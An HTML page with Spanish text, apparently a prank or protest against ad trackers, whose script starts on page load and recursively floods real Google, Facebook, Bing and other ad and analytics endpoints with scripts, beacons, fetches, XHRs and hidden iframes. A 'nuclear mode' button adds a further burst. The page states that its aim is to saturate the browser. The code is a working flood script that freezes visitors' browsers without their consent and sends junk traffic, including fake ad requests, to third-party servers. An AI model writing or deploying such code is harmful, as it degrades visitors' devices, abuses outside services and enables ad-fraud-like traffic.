<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<title>Cuidado no entrar rastreadores</title>
<style>
body{
  margin:0;
  background:black;
  color:#00ff00;
  font-family:monospace;
  overflow:hidden;
  text-align:center;
}
h1{
  margin-top:40px;
  font-size:4.5rem;
  animation: blink 0.4s infinite;
  text-shadow: 0 0 20px red;
}
#contador{
  font-size:2.6rem;
  margin:20px;
  color:#ff0000;
  text-shadow: 0 0 15px red;
}
button{
  padding:30px 60px;
  font-size:2.4rem;
  background:#c00;
  color:white;
  border:none;
  cursor:pointer;
  border-radius:12px;
  box-shadow:0 0 40px red;
  margin:30px;
}
button:hover{
  transform:scale(1.15);
}
@keyframes blink{ 50%{ opacity:0.1; } }
</style>
</head>
<body>
<h1>⚠ ZONA INFESTADA ⚠</h1>
<div id="contador">Requests enviadas: 0</div>

<button onclick="activarModoNuclear()">
☢ ACTIVAR MODO ULTRA NUCLEAR ☢
</button>

<div id="warning">Esto va a saturar el navegador lo más rápido posible 😈</div>

<script>
// Lista grande de recursos pesados
const resources = [
  "https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js",
  "https://securepubads.g.doubleclick.net/tag/js/gpt.js",
  "https://www.googletagservices.com/tag/js/gpt.js",
  "https://connect.facebook.net/en_US/fbevents.js",
  "https://www.google-analytics.com/analytics.js",
  "https://bat.bing.com/bat.js",
  "https://cdn.taboola.com/lib/native.js",
  "https://widgets.outbrain.com/outbrain.js",
  "https://static.ads-twitter.com/uwt.js",
  "https://acdn.adnxs.com/prebid/c/0/prebid.js",
  "https://googleads.g.doubleclick.net/pagead/ads",
  "https://cm.everesttech.net/cm",
  "https://pixel.quantserve.com/pixel",
  "https://sync.crwdcntrl.net/",
  "https://cdn.segment.com/analytics.js/"
];

let total = 0;
let running = false;

function spamRapido() {
  if (!running) return;

  const url = resources[Math.floor(Math.random() * resources.length)];
  const cacheBuster = "?t=" + Date.now() + "&r=" + Math.random();

  // 1. Script
  const s = document.createElement("script");
  s.src = url + cacheBuster;
  s.async = true;
  document.body.appendChild(s);

  // 2. Imagen (Beacon)
  const img = new Image();
  img.src = url + cacheBuster;
  document.body.appendChild(img);

  // 3. Fetch (muy agresivo)
  fetch(url + cacheBuster, { 
    mode: 'no-cors', 
    cache: 'no-store' 
  }).catch(() => {});

  // 4. XMLHttpRequest
  try {
    const xhr = new XMLHttpRequest();
    xhr.open("GET", url + cacheBuster, true);
    xhr.send();
  } catch(e) {}

  // 5. Iframe
  if (Math.random() > 0.7) {
    const iframe = document.createElement("iframe");
    iframe.src = "https://googleads.g.doubleclick.net/pagead/ads?client=ca-pub-" + Math.random().toString().slice(2,15);
    iframe.style.display = "none";
    document.body.appendChild(iframe);
  }

  total += 5; // aproximado
  document.getElementById("contador").innerText = `Requests enviadas: ${total.toLocaleString()}`;

  // Llamada recursiva lo más rápido posible
  setTimeout(spamRapido, 0);   // Máxima velocidad
}

function activarModoNuclear() {
  running = true;
  document.body.style.background = "#200";
  document.body.style.color = "#ff2222";
  document.querySelector("h1").innerText = "☢ MODO ULTRA NUCLEAR ACTIVADO ☢";

  // Ráfaga inicial brutal
  for(let i = 0; i < 150; i++) {
    setTimeout(() => {
      for(let j = 0; j < 8; j++) spamRapido();
    }, i * 4);
  }

  spamRapido();
  alert("¡Preparate! Se va a saturar todo lo que pueda 😈");
}

// Iniciar automáticamente con fuerza media-alta
running = true;
setTimeout(() => {
  for(let i = 0; i < 40; i++) spamRapido();
}, 500);

spamRapido();
</script>
</body>
</html>
